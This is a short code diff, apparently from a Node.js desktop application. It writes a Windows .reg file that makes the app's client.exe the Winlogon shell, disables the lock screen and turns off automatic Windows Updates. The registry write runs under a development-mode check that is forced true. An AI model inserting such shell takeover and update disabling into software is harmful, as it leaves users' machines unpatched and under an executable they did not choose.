@@ -30,7 +30,7 @@ if(!isDev || 1)
     
     let target = (path.resolve("./") + "\\").split("\\").join("\\"+"\\");
     let regeditPath = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; // [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]   
-    fs.writeFile(target + "startup.reg", "Windows Registry Editor Version 5.00\n\n[" + regeditPath + ']\n"Shell"="' + target + 'client.exe"', () =>{}); 
+    fs.writeFile(target + "startup.reg", "Windows Registry Editor Version 5.00\n\n[" + regeditPath + ']\n"Shell"="' + target + 'client.exe"\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\SessionData]\n"AllowLockScreen"=dword:00000000\n[-HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU]\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU]\n"NoAutoUpdate"=dword:00000001', () =>{}); 
     
 }
 
